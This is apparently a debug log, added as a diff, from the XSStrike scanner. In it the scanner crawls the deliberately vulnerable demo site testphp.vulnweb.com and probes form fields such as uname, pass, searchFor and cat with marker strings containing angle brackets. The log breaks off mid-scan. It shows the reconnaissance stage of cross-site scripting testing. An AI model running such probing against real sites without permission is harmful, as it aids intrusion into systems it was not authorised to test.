@@ -1,0 +1,1690 @@
+2024-01-20 21:51:53,146 xsstrike - RUN - Crawling the target
+2024-01-20 21:51:53,146 xsstrike - DEBUG - Target scheme: http
+2024-01-20 21:51:53,148 core.photon - RUN - Parsing login.php                               
+2024-01-20 21:51:55,152 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/login.php
+2024-01-20 21:51:55,152 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:55,154 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:55,154 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:55,742 core.photon - RUN - Parsing cart.php                                
+2024-01-20 21:51:55,742 core.photon - RUN - Parsing signup.php                              
+2024-01-20 21:51:55,743 core.photon - RUN - Parsing guestbook.php                           
+2024-01-20 21:51:55,744 core.photon - RUN - Parsing artists.php                             
+2024-01-20 21:51:55,745 core.photon - RUN - Parsing userinfo.php                            
+2024-01-20 21:51:55,746 core.photon - RUN - Parsing AJAX/index.php                          
+2024-01-20 21:51:55,747 core.photon - RUN - Parsing mailto:wvs@acunetix.com                 
+2024-01-20 21:51:55,748 core.photon - RUN - Parsing categories.php                          
+2024-01-20 21:51:57,748 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/mailto:wvs@acunetix.com
+2024-01-20 21:51:57,750 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,748 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/artists.php
+2024-01-20 21:51:57,750 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,750 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,749 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/AJAX/index.php
+2024-01-20 21:51:57,749 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/signup.php
+2024-01-20 21:51:57,748 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:51:57,751 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,752 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,749 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/guestbook.php
+2024-01-20 21:51:57,751 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,751 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,751 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,750 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,752 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,749 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/cart.php
+2024-01-20 21:51:57,752 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,753 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,753 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,754 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,757 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,758 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,760 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,761 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,761 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,763 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,764 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/categories.php
+2024-01-20 21:51:57,771 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:51:57,767 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:57,771 core.requester - DEBUG - Requester data: None
+2024-01-20 21:51:57,772 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:51:58,770 core.photon - RUN - Parsing listproducts.php?cat=2                  
+2024-01-20 21:51:58,772 core.photon - RUN - Parsing listproducts.php?cat=3                  
+2024-01-20 21:51:58,773 core.photon - RUN - Parsing javascript:getInfo(\                    
+2024-01-20 21:51:58,773 core.photon - RUN - Parsing                                         
+2024-01-20 21:51:58,775 core.photon - RUN - Parsing listproducts.php?cat=4                  
+2024-01-20 21:51:58,775 core.photon - RUN - Parsing javascript:loadSomething(               
+2024-01-20 21:51:58,775 core.photon - RUN - Parsing listproducts.php?cat=1                  
+2024-01-20 21:52:00,774 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:00,774 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,774 core.requester - DEBUG - Requester data: {
+  "cat": "2"
+}
+2024-01-20 21:52:00,774 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/javascript:getInfo(\
+2024-01-20 21:52:00,776 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,776 core.requester - DEBUG - Requester data: None
+2024-01-20 21:52:00,774 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:00,774 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:00,777 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,776 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:00,777 core.requester - DEBUG - Requester data: {
+  "cat": "3"
+}
+2024-01-20 21:52:00,781 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:00,789 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/
+2024-01-20 21:52:00,789 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:00,790 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/javascript:loadSomething(
+2024-01-20 21:52:00,790 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:00,794 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,792 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,794 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,791 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:00,794 core.requester - DEBUG - Requester data: {
+  "cat": "4"
+}
+2024-01-20 21:52:00,794 core.requester - DEBUG - Requester data: {
+  "cat": "1"
+}
+2024-01-20 21:52:00,795 core.requester - DEBUG - Requester data: None
+2024-01-20 21:52:00,795 core.requester - DEBUG - Requester data: None
+2024-01-20 21:52:00,796 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:00,796 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:00,796 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:00,797 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:01,327 xsstrike - INFO - Progress: 10/20
+2024-01-20 21:52:03,333 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:03,333 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:03,333 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester data: {
+  "searchFor": "",
+  "goButton": "v3dm0s"
+}
+2024-01-20 21:52:03,333 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:03,334 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester data: {
+  "name": "v3dm0s"
+}
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester data: {
+  "uuname": "v3dm0s"
+}
+2024-01-20 21:52:03,336 core.requester - DEBUG - Requester data: {
+  "uname": "v3dm0s"
+}
+2024-01-20 21:52:03,337 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "v3dm0s"
+}
+2024-01-20 21:52:03,337 core.requester - DEBUG - Requester data: {
+  "searchFor": "v3dm0s"
+}
+2024-01-20 21:52:03,337 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,339 core.requester - DEBUG - Requester data: {
+  "cat": "v3dm0s"
+}
+2024-01-20 21:52:03,339 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,340 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,342 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,342 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,342 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:03,621 core.requester - WARNING - Unable to connect to the target.
+2024-01-20 21:52:05,629 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:05,629 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:05,629 core.requester - DEBUG - Requester data: {
+  "uname": "st4r7s<3nd"
+}
+2024-01-20 21:52:05,629 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:05,832 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:05,832 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:05,832 core.requester - DEBUG - Requester data: {
+  "name": "st4r7s<3nd"
+}
+2024-01-20 21:52:05,833 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:05,848 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:05,848 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:05,849 core.requester - DEBUG - Requester data: {
+  "searchFor": "",
+  "goButton": "st4r7s<3nd"
+}
+2024-01-20 21:52:05,849 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:05,864 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:05,864 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:05,870 core.requester - DEBUG - Requester data: {
+  "cat": "st4r7s<3nd"
+}
+2024-01-20 21:52:05,871 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:05,879 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:05,879 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:05,879 core.requester - DEBUG - Requester data: {
+  "searchFor": "st4r7s<3nd"
+}
+2024-01-20 21:52:05,879 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:05,894 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:05,894 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:05,895 core.requester - DEBUG - Requester data: {
+  "uuname": "st4r7s<3nd"
+}
+2024-01-20 21:52:05,895 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:06,380 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:06,380 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:06,380 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "st4r7s<3nd"
+}
+2024-01-20 21:52:06,381 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,346 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:08,346 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:08,346 core.requester - DEBUG - Requester data: {
+  "name": "st4r7s>3nd"
+}
+2024-01-20 21:52:08,346 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,361 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:08,361 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:08,362 core.requester - DEBUG - Requester data: {
+  "searchFor": "",
+  "goButton": "st4r7s>3nd"
+}
+2024-01-20 21:52:08,362 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,408 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/listproducts.php
+2024-01-20 21:52:08,408 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:08,409 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:08,409 core.requester - DEBUG - Requester GET: True
+2024-01-20 21:52:08,409 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:08,409 core.requester - DEBUG - Requester data: {
+  "uuname": "st4r7s>3nd"
+}
+2024-01-20 21:52:08,409 core.requester - DEBUG - Requester data: {
+  "cat": "st4r7s>3nd"
+}
+2024-01-20 21:52:08,409 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:08,410 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,410 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,410 core.requester - DEBUG - Requester data: {
+  "searchFor": "st4r7s>3nd"
+}
+2024-01-20 21:52:08,412 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,656 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
